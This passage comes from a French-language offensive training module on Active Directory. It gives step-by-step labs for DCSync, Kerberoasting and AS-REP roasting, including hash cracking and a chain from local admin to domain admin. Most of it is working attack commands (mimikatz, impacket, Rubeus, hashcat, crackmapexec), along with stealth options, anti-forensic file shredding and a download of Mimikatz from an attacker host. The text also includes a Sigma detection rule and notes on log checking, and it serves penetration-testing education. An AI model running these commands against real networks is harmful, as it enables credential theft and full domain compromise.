# /csv : format tabulaire avec séparateur deux-points
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator /csv
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `lsadump::dcsync` | Simule une réplication de contrôleur de domaine via MS-DRSR |
| `/domain:corp.local` | Nom du domaine à répliquer |
| `/all` | Synchronise tous les comptes du domaine |
| `/user:USER` | Synchronise un seul compte spécifique (plus discret) |
| `/csv` | Sortie au format CSV (deux-points) |

### 7.3 Prérequis et détection

#### Droits nécessaires

| Groupe | Droit de réplication |
|---|---|
| **Domain Admins** | Oui |
| **Enterprise Admins** | Oui |
| **Administrators** (du domaine) | Oui |
| **Domain Controllers** | Oui (compte machine des DC) |
| **Comptes délégués** | Si droits délégués explicitement |

#### Détection : EventID 4662

Windows Security Log génère l'EventID **4662** pour les accès aux objets Active Directory.

| GUID | Signification |
|---|---|
| `19195a5b-6da0-11d0-afd3-00c04fd930c7` | SamDomain (objet DS) |
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes-All |
| `89e95b76-444d-4c62-991a-0facbeda640c` | DS-Replication-Get-Changes-In-Filtered-Set |

#### Règle Sigma pour DCSync

```yaml
title: DCSync Attack via Directory Replication
id: 6f4c3b2a-1d8e-4f7a-9c5b-3a2d1e0f4c8b
status: experimental
description: Détecte les tentatives de DCSync via les droits de réplication Active Directory
references:
  - https://attack.mitre.org/techniques/T1003/006/
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    ObjectType: '19195a5b-6da0-11d0-afd3-00c04fd930c7'
    AccessMask:
      - '0x100'
      - '0x200'
    Properties:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  condition: selection
falsepositives:
  - Réplication légitime entre DCs
  - Outils d'administration AD légitimes
level: high
```

### 7.4 TP Guidé : DCSync pour extraire tous les hashs du domaine

#### Objectif

Depuis un compte avec droits d'administration domaine, effectuer un DCSync pour extraire tous les hashs du domaine.

#### Scénario

```
Compte: CORP\Administrator (membre de Domain Admins)
DC: DC01.corp.local (10.0.1.10)
Machine attaquante: Kali Linux (10.0.1.15)
```

#### Étape 1 : Vérification des droits

```bash
# Test d'authentification SMB sur le DC (confirme que le compte est admin domaine)
crackmapexec smb 10.0.1.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
# Énumère les utilisateurs du domaine via SAMR (Security Account Manager Remote)
# --users : liste les comptes utilisateurs du domaine (confirme l'accès AD)
crackmapexec smb 10.0.1.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --users
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `crackmapexec smb DC_IP -u USER -H HASH` | Teste l'authentification sur le contrôleur de domaine |
| `--users` | Énumère les utilisateurs du domaine (nécessite des droits suffisants) |

#### Étape 2 : DCSync

```bash
# DCSync avec mot de passe en clair (demande interactive)
impacket-secretsdump -just-dc corp.local/Administrator@DC01.corp.local

# DCSync avec hash NTLM (PtH) et sauvegarde des résultats dans un fichier
# > dc_hashes.txt : redirige toute la sortie vers un fichier pour analyse
impacket-secretsdump -just-dc -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@DC01.corp.local > dc_hashes.txt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-secretsdump -just-dc DOMAIN/USER@DC` | DCSync complet : extrait tous les hashs du domaine via DRSUAPI |
| `> dc_hashes.txt` | Redirige la sortie standard vers un fichier pour analyse ultérieure |

#### Étape 3 : Analyser les résultats

```bash
# Extrait les lignes contenant des comptes (format : NOM:RID:LMHASH:NTHASH)
# grep -E '^[^:]+:[0-9]+:' : filtre les lignes qui commencent par un nom suivi de ":NUMBER:"
# cut -d: -f1,4 : garde uniquement les colonnes 1 (nom) et 4 (hash NTLM)
# > ntlm_hashes.txt : sauvegarde dans un fichier
grep -E '^[^:]+:[0-9]+:' dc_hashes.txt | cut -d: -f1,4 > ntlm_hashes.txt

# Compte le nombre de hashs extraits (nombre de lignes dans le fichier)
wc -l ntlm_hashes.txt

# Recherche les comptes à haute valeur : admin, service, backup, sql
# -i : insensible à la casse
grep -i 'admin\|service\|svc_\|backup\|sql' dc_hashes.txt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `grep -E '^[^:]+:[0-9]+:' dc_hashes.txt` | Filtre les lignes correspondant au format `compte:RID:LM:NTLM` (lignes de compte valides, pas les en-têtes) |
| `cut -d: -f1,4` | Extrait les champs 1 (nom du compte) et 4 (hash NTLM) séparés par `:` |
| `wc -l ntlm_hashes.txt` | Compte le nombre de lignes (nombre de comptes extraits) |
| `grep -i 'admin\|service\|svc_\|backup\|sql'` | Cherche les comptes sensibles : administrateur, services, sauvegardes, bases de données |

**Identifier les comptes clés :**

| Compte | RID | Intérêt |
|---|---|---|
| `Administrator` | 500 | Admin domaine par défaut |
| `krbtgt` | 502 | Clé de chiffrement des tickets (Golden Ticket) |
| `svc_sql` | 1200 | Compte de service SQL |
| `backup_user` | 1500 | Compte de sauvegarde |

#### Étape 4 : Extraire le KRBTGT

```bash
# DCSync ciblé sur le compte KRBTGT uniquement
# Ce hash permet de créer des Golden Tickets (TGT pour n'importe quel utilisateur)
impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator@DC01.corp.local
# Résultat : le hash NTLM du compte KRBTGT
# $krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e:::
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER@DC` | Extrait uniquement le hash du compte KRBTGT (RID 502). Indispensable pour forger des Golden Tickets |

#### Étape 5 : Nettoyage

```bash
# Supprime définitivement les fichiers contenant les hashs extraits
# shred : écrase le fichier plusieurs fois avant de le supprimer
# -u : supprime le fichier après l'avoir écrasé (unlink)
# Empêche la récupération forensique des hashs sur le disque
shred -u dc_hashes.txt ntlm_hashes.txt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `shred -u FICHIER1 FICHIER2` | Écrase les fichiers avec des données aléatoires (plusieurs passes) puis les supprime. `-u` = unlink (suppression après écrasement). Évite que les hashs soient récupérés par analyse forensique |

---

## 8. Kerberoasting (T1558.003)

### 8.1 Principe

Le **Kerberoasting** est une technique qui permet d'obtenir le hash (TGS) d'un compte de service Active Directory, puis de le casser offline pour récupérer son mot de passe en clair.

**Fonctionnement :**

```
┌────────────────┐                    ┌────────────────┐
│  Attaquant     │  TGS-REQ           │  KDC (DC)      │
│  (n'importe    │  (SPN: sql/srv01)  │                │
│   quel compte  │  ────────────────>  │                │
│   domaine)     │                    │                │
│               │  <────────────────  │                │
│               │  TGS-REP           │                │
│               │  (hash chiffré     │                │
│               │   avec clé du      │                │
│               │   compte service)  │                │
└────────────────┘                    └────────────────┘
┌────────────────┐
│  Offline       │
│  ────────────  │
│  TGS cracké   │
│  avec hashcat  │
└────────────────┘
```

**Pourquoi ça marche ?**

1. N'importe quel utilisateur du domaine peut demander un TGS pour n'importe quel SPN
2. Le TGS est chiffré avec la clé (hash NTLM) du **compte de service**
3. L'attaquant peut tenter de casser ce hash offline, sans interaction avec le domaine
4. Les mots de passe des comptes de service sont souvent faibles ou par défaut

**SPN (Service Principal Name) :**

```
<service>/<host>:<port>/<realm>
```

Exemples :
- `MSSQLSvc/SRV01.corp.local:1433` — Service SQL Server
- `HTTP/WEBSRV01.corp.local` — Service web (IIS)
- `CIFS/FILESERVER.corp.local` — Partage de fichiers

### 8.2 Outils pour le Kerberoasting

#### impacket-GetUserSPNs.py

```bash
# Découverte des comptes de service (SPN) + demande des TGS (Kerberoasting)
# Format : impacket-GetUserSPNs <DOMAINE>/<USER>:<MDP>
# -dc-ip : IP du DC (évite la résolution DNS)
# -request : demande les TGS (sans cette option, liste seulement les SPN)
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10 -request

# Kerberoasting avec authentification par hash NTLM (PtH)
impacket-GetUserSPNs corp.local/jdupont -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 10.0.1.10 -request

# Demande des TGS avec format compatible hashcat (recommandé pour le cracking)
# -format hashcat : sortie formatée pour hashcat (mode 13100)
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10 -request -format hashcat

# Sauvegarde des TGS dans un fichier pour cracking offline
# -outputfile : fichier de sortie contenant les hashs TGS
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10 -request -outputfile kerberoast_tgs.txt

# Lister UNIQUEMENT les SPN (sans demander les TGS)
# Utile pour un repérage discret (ne génère pas d'EventID 4769)
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10
```

**Paramètres importants :**

| Option | Description |
|---|---|
| `-request` | Demander les TGS au KDC (génère les hashs à cracker). Sans cette option, seule la liste des SPN est affichée |
| `-format hashcat` | Formate la sortie pour hashcat (mode 13100 pour RC4, 19700 pour AES256) |
| `-outputfile FILE` | Sauvegarde les TGS dans un fichier |
| `-dc-ip IP` | Adresse IP du contrôleur de domaine (évite la résolution DNS) |
| `-hashes LM:NTLM` | Authentification par hash NTLM |

**Sortie typique :**

```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Getting domain information
[*] Found 3 users with SPNs:

ServicePrincipalName                                 Name           MemberOf
---------------------------------------------------  -------------  ---------
MSSQLSvc/SRV01.corp.local:1433                       svc_sql        CN=Service Accounts,CN=Users,DC=corp,DC=local
HTTP/WEBSRV01.corp.local                             svc_web        CN=Service Accounts,CN=Users,DC=corp,DC=local
ldap/DC01.corp.local/CORP.LOCAL                      svc_ldap       CN=Service Accounts,CN=Users,DC=corp,DC=local

[*] Getting TGS for each user...

$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/SRV01.corp.local:1433*$8f9a0b1c2d3e4f5a$4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
```

#### Rubeus kerberoast

```powershell
# Kerberoasting basique : découvre tous les SPN et demande les TGS
# Nécessite d'être connecté avec un compte domaine
Rubeus.exe kerberoast

# Demande les TGS avec sortie formatée pour hashcat
# /outfile : sauvegarde les hashs dans un fichier
# /format:hashcat : format compatible hashcat (mode 13100)
Rubeus.exe kerberoast /outfile:tgs_hashes.txt /format:hashcat

# Cibler un utilisateur SPN spécifique (plus discret)
# /user : nom du compte de service à cibler
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt

# Affiche des statistiques sur les SPN (sans demander les TGS)
# /stats : compte les SPN par type, sans générer d'EventID 4769
Rubeus.exe kerberoast /stats

# Mode OPSEC : utilise des techniques plus furtives
# (rotation des IP, délais entre requêtes, etc.)
Rubeus.exe kerberoast /opsec
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `Rubeus.exe kerberoast` | Lance un Kerberoasting : découvre les SPN et demande les TGS |
| `/outfile:FICHIER.txt` | Sauvegarde les hashs dans un fichier texte |
| `/format:hashcat` | Format compatible hashcat (recommandé pour le cracking) |
| `/user:USER` | Cible un compte de service spécifique (plus discret) |
| `/stats` | Mode statistiques : compte et catégorise les SPN sans demander les TGS |
| `/opsec` | Mode OPSEC : furtivité renforcée (délais, rotation, etc.) |

### 8.3 Cracking des hashs TGS

#### Format du hash TGS

```
$krb5tgs$23$*<user>$<realm>$<spn>*$<enc_part>$<hash>
```

Exemple :
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/SRV01.corp.local:1433*$8f9a0b1c2d3e4f5a$4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
```

#### Avec Hashcat

```bash
# Mode 13100 = Kerberos TGS RC4 (hash de type 23)
# -m 13100 : mode de hash pour les TGS Kerberos RC4
# kerberoast_tgs.txt : fichier contenant les TGS extraits
# rockyou.txt : wordlist de mots de passe
# -o cracked.txt : fichier de sortie pour les mots de passe trouvés
hashcat -m 13100 kerberoast_tgs.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

# Avec règles de transformation (best64.rule)
# -r : applique des règles de mutation (leet speak, majuscules, chiffres, etc.)
# Augmente le taux de réussite mais ralentit le cracking
hashcat -m 13100 kerberoast_tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked.txt

# Si le TGS utilise AES256 (type 18) : mode 19700
# Si le TGS utilise AES128 (type 17) : mode 19600
# Les TGS AES sont plus longs à cracker que RC4
hashcat -m 19700 kerberoast_aes_tgs.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

**Paramètres hashcat :**

| Option | Description |
|---|---|
| `-m 13100` | Mode hashcat : Kerberos TGS (RC4-HMAC / type 23) |
| `-m 19700` | Mode hashcat : Kerberos TGS (AES256 / type 18) |
| `-m 19600` | Mode hashcat : Kerberos TGS (AES128 / type 17) |
| `-a 0` | Mode d'attaque : dictionnaire (par défaut) |
| `-r FICHIER.rule` | Fichier de règles de transformation (ex: best64.rule) |
| `-o FICHIER` | Fichier de sortie : mots de passe crackés |
| `-O` | Mode optimisation (limite la longueur des mots de passe testés pour accélérer) |
| `-w 4` | Workload profile : 4 = performance maximale |

**Paramètres hashcat :**

| Option | Description |
|---|---|
| `-m 13100` | Mode : Kerberos TGS (RC4) |
| `-m 19700` | Mode : Kerberos TGS (AES256) |
| `-a 0` | Attaque par dictionnaire (par défaut) |
| `-r` | Fichier de règles |
| `-o` | Fichier de sortie |
| `-O` | Mode optimisation |
| `-w 4` | Workload profile (4 = max performance) |

#### Avec John the Ripper

```bash
# Cracking des TGS Kerberos avec John the Ripper
# --format=krb5tgs : format de hash Kerberos TGS
# --wordlist= : dictionnaire de mots de passe
john --format=krb5tgs kerberoast_tgs.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Affiche les mots de passe déjà crackés (sans relancer le cracking)
# --show : montre les résultats des tentatives précédentes
john --format=krb5tgs --show kerberoast_tgs.txt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `john --format=krb5tgs FICHIER --wordlist=ROCKYOU` | Crack les hashs TGS Kerberos avec JtR |
| `john --format=krb5tgs --show FICHIER` | Affiche les hashs déjà crackés (sans recracker) |

### 8.4 TP Guidé : Kerberoasting complet

#### Objectif

1. Identifier les comptes de service du domaine
2. Demander leurs TGS
3. Casser les hashs offline
4. Utiliser les mots de passe obtenus

#### Étape 1 : Découverte des SPN

```bash
# Liste les comptes de service (SPN) du domaine sans demander les TGS
# Permet un repérage discret (ne génère pas d'EventID 4769)
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip IP` | Liste les SPN (comptes de service) du domaine. Sans `-request`, ne génère que du trafic LDAP discret |

**Questions :**
1. Combien de comptes de service sont trouvés ?
2. Quels sont leurs SPN ?
3. Sont-ils membres de groupes privilégiés ?

#### Étape 2 : Demander les TGS

```bash
# Demande les TGS pour tous les SPN et les sauvegarde dans un fichier
# -request : génère les requêtes TGS (EventID 4769 sur le DC)
# -outputfile : fichier de sortie pour les hashs
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10 -request -outputfile all_tgs.txt

# Demande le TGS pour un utilisateur SPN spécifique uniquement
# -users svc_sql : cible uniquement le compte svc_sql (plus discret)
impacket-GetUserSPNs corp.local/jdupont:MonMDP -dc-ip 10.0.1.10 -request -outputfile svc_sql_tgs.txt -users svc_sql
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `-request` | Demande les TGS au KDC (génère les hashs) |
| `-outputfile FICHIER` | Sauvegarde les TGS dans le fichier spécifié |
| `-users USER` | Cible un utilisateur SPN spécifique (plus discret) |

#### Étape 3 : Cracking

```bash
# Cracking simple avec dictionnaire
hashcat -m 13100 all_tgs.txt /usr/share/wordlists/rockyou.txt -o cracked_tgs.txt

# Cracking avec règles best64.rule (plus de chances de succès)
hashcat -m 13100 all_tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked_tgs.txt

# Affiche les hashs déjà crackés (sans relancer le cracking)
hashcat -m 13100 --show all_tgs.txt

# Affiche le contenu du fichier de résultats (mots de passe trouvés)
cat cracked_tgs.txt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `hashcat -m 13100 FICHIER DICT -o OUT` | Crack les TGS RC4 avec dictionnaire |
| `-r best64.rule` | Applique les 64 règles de mutation les plus efficaces |
| `--show` | Affiche les hashs déjà crackés sans relancer |
| `cat cracked_tgs.txt` | Lit le fichier de résultats |

#### Étape 4 : Utilisation des mots de passe

```bash
# Teste le mot de passe cracké sur les machines du réseau
# Vérifie si le compte de service a des droits administrateur locaux
crackmapexec smb 10.0.1.50 -u svc_sql -p 'SqlP@ss123!'
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `crackmapexec smb IP -u USER -p PASS` | Teste le mot de passe cracké contre la cible. Permet de vérifier les droits du compte de service |

#### Étape 5 : Logs sur le DC

```powershell
# Recherche les événements 4769 (TGS demandé) dans le journal de sécurité
# Filtre sur les SPN qui contiennent "MSSQLSvc" (service SQL Server)
# $_.Id -eq 4769 : EventID pour les requêtes TGS
# $_.Properties[8].Value : contient le SPN demandé
# Permet de vérifier quelles demandes TGS ont été générées par le Kerberoasting
Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4769 -and $_.Properties[8].Value -like '*MSSQLSvc*' }
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `Get-WinEvent -LogName Security` | Récupère le journal de sécurité Windows |
| `Where-Object { $_.Id -eq 4769 }` | Filtre sur l'EventID 4769 (Kerberos TGS demandé) |
| `$_.Properties[8].Value -like '*MSSQLSvc*'` | Filtre sur les SPN contenant "MSSQLSvc" |

---

## 9. AS-REP Roasting (T1558.004)

### 9.1 Principe

L'**AS-REP Roasting** est une technique qui cible les comptes Active Directory pour lesquels la **pré-authentification Kerberos est désactivée** (UF_DONT_REQUIRE_PREAUTH).

**Fonctionnement normal :**

```
1) Client → DC : AS-REQ (timestamp chiffré avec hash NTLM du client)
2) DC → Client : AS-REP (TGT chiffré avec clé KRBTGT)
```

**Sans pré-authentification :**

```
1) Attaquant → DC : AS-REQ (pour le compte cible, sans timestamp)
2) DC → Attaquant : AS-REP (contient un bloc chiffré avec la clé du compte cible)
3) Attaquant : cracke le bloc offline (hashcat / john)
```

**Pourquoi ça marche ?**

L'AS-REP contient une partie des données chiffrées avec la clé du compte cible. Comme l'attaquant peut demander cette réponse sans authentification, il peut tenter de casser cette partie chiffrée offline.

### 9.2 Outils pour l'AS-REP Roasting

#### impacket-GetNPUsers.py

```bash
# Demande l'AS-REP pour chaque utilisateur dans le fichier users.txt
# Les comptes avec UF_DONT_REQUIRE_PREAUTH retourneront un hash
# Format : impacket-GetNPUsers <DOMAINE>/ -dc-ip <DC_IP> -no-pass -usersfile <FICHIER>
# -no-pass : pas de mot de passe (l'attaque ne nécessite PAS d'authentification)
impacket-GetNPUsers corp.local/ -dc-ip 10.0.1.10 -no-pass -usersfile users.txt

# Même commande (répétée pour illustration)
impacket-GetNPUsers corp.local/ -dc-ip 10.0.1.10 -no-pass -usersfile users.txt

# Demande avec format compatible hashcat et sauvegarde dans un fichier
# -format hashcat : sortie formatée pour hashcat (mode 18200)
# -outputfile : fichier de sortie
impacket-GetNPUsers corp.local/ -dc-ip 10.0.1.10 -no-pass -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

**Paramètres :**

| Option | Description |
|---|---|
| `-no-pass` | Pas de mot de passe (l'attaque AS-REP Roasting ne nécessite pas d'authentification préalable) |
| `-usersfile FILE` | Fichier contenant les noms d'utilisateurs à tester (un par ligne) |
| `-format hashcat` | Format compatible hashcat (mode 18200 pour AS-REP RC4) |
| `-outputfile FILE` | Fichier de sortie pour les hashs |
| `-dc-ip IP` | Adresse IP du contrôleur de domaine |

**Paramètres :**

| Option | Description |
|---|---|
| `-no-pass` | Pas de mot de passe (pas nécessaire) |
| `-usersfile FILE` | Fichier contenant les noms d'utilisateurs |
| `-format hashcat` | Format compatible hashcat |
| `-outputfile FILE` | Fichier de sortie |
| `-dc-ip IP` | Adresse du contrôleur de domaine |

**Sortie typique :**

```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Getting domain information
[-] User jdupont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] User srochard has UF_DONT_REQUIRE_PREAUTH set!
$krb5asrep$23$srochard@CORP.LOCAL:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c
```

#### Rubeus asreproast

```powershell
# AS-REP Roasting basique : test tous les utilisateurs du domaine
# Nécessite un compte domaine connecté (pour l'énumération des utilisateurs)
Rubeus.exe asreproast

# Avec sortie formatée pour hashcat
# /format:hashcat : mode 18200 (AS-REP RC4)
# /outfile : sauvegarde les hashs dans un fichier
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Avec une liste d'utilisateurs spécifique
# /user:users.txt : fichier contenant les noms d'utilisateurs à tester
Rubeus.exe asreproast /user:users.txt /format:hashcat

# Cibler un domaine spécifique
# /domain : force le domaine cible
Rubeus.exe asreproast /domain:corp.local /format:hashcat
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `Rubeus.exe asreproast` | Lance l'AS-REP Roasting : teste chaque utilisateur du domaine |
| `/format:hashcat` | Format compatible hashcat (mode 18200) |
| `/outfile:FICHIER` | Sauvegarde les hashs dans un fichier |
| `/user:FICHIER.txt` | Liste d'utilisateurs à tester (un par ligne) |
| `/domain:DOMAIN` | Spécifie le domaine cible |

#### Détection des comptes sans pré-authentification

```powershell
# Avec PowerView (outil PowerShell d'audit AD)
# Get-DomainUser : récupère les utilisateurs du domaine
# -PreauthNotRequired : filtre les comptes avec DONT_REQUIRE_PREAUTH
# -Properties : sélectionne les propriétés à afficher (nom du compte, UPN)
Get-DomainUser -PreauthNotRequired -Properties samaccountname,userprincipalname
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `Get-DomainUser` | Fonction PowerView qui énumère les utilisateurs AD |
| `-PreauthNotRequired` | Filtre : comptes où la pré-authentification Kerberos est désactivée (vulnérables à l'AS-REP Roasting) |
| `-Properties samaccountname,userprincipalname` | Limite l'affichage aux nom du compte (SAM) et UPN |

### 9.3 Cracking des hashs AS-REP

#### Format du hash

```
$krb5asrep$23$<user>@<realm>:<hash>
```

Exemple :
```
$krb5asrep$23$srochard@CORP.LOCAL:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c
```

#### Avec Hashcat

```bash
# Mode 18200 = Kerberos AS-REP RC4 (hash de type 23)
# Cracking des hashs AS-REP avec dictionnaire rockyou
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked_asrep.txt

# Cracking avec règles de transformation best64.rule
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked_asrep.txt

# Si le hash AS-REP utilise AES256 (type 18) : mode 19900
# Si le hash AS-REP utilise AES128 (type 17) : mode 19800
# Les hashs AES sont plus longs à cracker (itérations supplémentaires)
# Type 18 (AES256) : -m 19900
# Type 17 (AES128) : -m 19800
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `-m 18200` | Mode hashcat : Kerberos AS-REP (RC4-HMAC / type 23) |
| `-m 19900` | Mode hashcat : Kerberos AS-REP (AES256 / type 18) |
| `-m 19800` | Mode hashcat : Kerberos AS-REP (AES128 / type 17) |
| `-r best64.rule` | Applique les règles de mutation pour augmenter les chances de succès |

#### Avec John the Ripper

```bash
# Cracking des hashs AS-REP avec John the Ripper
# --format=krb5asrep : format Kerberos AS-REP
john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Affiche les mots de passe déjà crackés
john --show asrep_hashes.txt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `john --format=krb5asrep FICHIER --wordlist=DICT` | Crack les hashs AS-REP avec JtR |
| `john --show FICHIER` | Affiche les résultats déjà crackés |

### 9.4 TP Guidé : AS-REP Roasting

#### Objectif

1. Créer une liste d'utilisateurs du domaine
2. Tester chaque utilisateur pour l'attribut `DONT_REQUIRE_PREAUTH`
3. Récupérer les AS-REP des comptes vulnérables
4. Casser les hashs offline

#### Étape 1 : Générer une liste d'utilisateurs

```bash
# Méthode 1 : Enumération des utilisateurs avec crackmapexec
# --users : liste les comptes du domaine
# > users_raw.txt : sauvegarde brute dans un fichier
crackmapexec smb 10.0.1.10 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --users > users_raw.txt
# Extrait uniquement les noms d'utilisateurs (premier mot de chaque ligne)
# grep -oP '^[^\s]+' : utilise une regex pour capturer le premier champ non-espace
grep -oP '^[^\s]+' users_raw.txt > users.txt

# Méthode 2 : Énumération via lookupsid (protocole SAMR)
# impacket-lookupsid : interroge le SAM distant pour lister les utilisateurs
# grep -oP '.*\\(.*)' : extrait le nom après le backslash
# sort -u : trie et supprime les doublons
impacket-lookupsid corp.local/Administrator:MonMDP@10.0.1.10 | grep -oP '.*\\(.*)' | sort -u > users.txt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `crackmapexec smb DC_IP -u USER -H HASH --users` | Énumère les utilisateurs du domaine via SAMR |
| `grep -oP '^[^\s]+'` | Extrait le premier mot de chaque ligne (nom d'utilisateur) |
| `impacket-lookupsid DOMAIN/USER:PASS@DC` | Énumère les SID et noms d'utilisateurs via le SAM Remote Protocol |
| `sort -u` | Trie et supprime les doublons de la liste |

#### Étape 2 : AS-REP Roasting

```bash
# Teste chaque utilisateur de la liste pour l'attribut DONT_REQUIRE_PREAUTH
# Les comptes vulnérables retournent un hash AS-REP
# Format : impacket-GetNPUsers <DOMAINE>/ -dc-ip <IP> -no-pass -usersfile <LISTE>
# -format hashcat : sortie compatible hashcat
# -outputfile : fichier de sortie pour les hashs
impacket-GetNPUsers corp.local/ -dc-ip 10.0.1.10 -no-pass -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-GetNPUsers DOMAIN/ -dc-ip IP -no-pass -usersfile FILE -format hashcat -outputfile OUT` | Teste chaque utilisateur du fichier : si le compte a `DONT_REQUIRE_PREAUTH`, l'AS-REP est retourné sous forme de hash à cracker |

#### Étape 3 : Cracking

```bash
# Tente de casser les hashs AS-REP avec le dictionnaire rockyou
# Mode 18200 = Kerberos AS-REP RC4
# --show : affiche les hashs déjà crackés si déjà lancé
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --show
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `hashcat -m 18200 FICHIER DICT --show` | Mode 18200 (AS-REP RC4). `--show` affiche les résultats précédents |

#### Étape 4 : Utilisation des credentials

```bash
# Teste le mot de passe cracké contre les machines du réseau
# Vérifie si le compte a des droits sur FILESERVER
crackmapexec smb 10.0.1.50 -u srochard -p 'MotDePasseTrouvé'
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `crackmapexec smb IP -u USER -p PASS` | Teste le mot de passe trouvé contre la cible SMB |

---

## 10. TP Synthèse : De Local Admin à Domain Admin

### 10.1 Scénario SCAD

**SCAD = Séquence Complète d'Attaque Dirigée**

Ce TP synthétise l'ensemble des techniques vues dans ce module. L'objectif est de partir d'un **poste compromis** avec accès administrateur local pour atteindre le **contrôle complet du domaine**.

#### Topologie

```
    Internet
       |
       | (Phishing → accès initial)
       ▼
┌────────────────┐
│  CORP-PC01     │  ← Machine cible initiale (admin local acquis)
│  10.0.1.15     │
└────────┬───────┘
         |
         |  Réseau interne (10.0.1.0/24)
         |
┌────────────────┐     ┌────────────────┐     ┌────────────────┐
│  FILESERVER    │     │  SRV01 (SQL)    │     │  DC01          │
│  10.0.1.50     │     │  10.0.1.30      │     │  10.0.1.10     │
│  Partages SMB  │     │  SQL Server     │     │  Contrôleur    │
└────────────────┘     └────────────────┘     │  de domaine    │
                                               └────────────────┘
```

#### Objectifs

| Étape | Action | Technique | Résultat attendu |
|---|---|---|---|
| 1 | Credential Dump sur PC01 | T1003.001 | Hash NTLM de l'admin local |
| 2 | Pass-the-Hash vers FILESERVER | T1550.002 | Shell sur FILESERVER |
| 3 | Credential Dump sur FILESERVER | T1003.001 | Hash NTLM d'un admin domaine |
| 4 | WMI exec sur SRV01 | T1021.003 | Shell sur SRV01 |
| 5 | DCSync sur DC01 | T1003.006 | Tous les hashs du domaine |
| 6 | Domain Admin | T1078.002 | Contrôle complet du domaine |

### 10.2 Déroulé détaillé

#### Étape 1 : Credential Dump sur PC01

```powershell
# Étape 1A : Transfert des outils vers la machine compromise
# Crée un objet WebClient pour télécharger des fichiers via HTTP
$client = New-Object System.Net.WebClient
# Télécharge Mimikatz depuis le serveur HTTP de la machine d'attaque
# .DownloadFile(URL, DESTINATION) : télécharge synchrone
